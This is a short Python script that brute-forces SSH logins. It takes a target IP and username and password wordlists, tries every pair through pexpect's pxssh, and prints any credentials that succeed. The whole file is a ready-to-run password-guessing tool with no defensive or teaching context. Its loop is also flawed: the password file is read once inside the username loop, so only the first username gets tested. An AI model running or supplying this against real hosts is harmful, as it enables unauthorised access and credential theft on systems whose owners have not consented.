from pexpect import pxssh
import sys 

def connect(host,username,password):
	print("checking: " + username +"/"+password)
	try:
		s = pxssh.pxssh()
		if s.login(host,username,password):
			print(" Found " + "username = " + username + " " + "password = " + password)
			sys.exit(0)
			
		
		else:
			pass
		
	except:
		pass
		
		
		
tgthost = raw_input("Enter target ip address")
user_dict = raw_input("Enter username wordlist file")
user_pass = raw_input("Enter  password wordlist ")
f1 = open(user_dict)
f2 = open(user_pass)
for usernames in f1.read().splitlines():
	for passwords in f2.read().splitlines():
		connect(tgthost,usernames.rstrip('\n'),passwords.rstrip('\n'))
		
		
		 





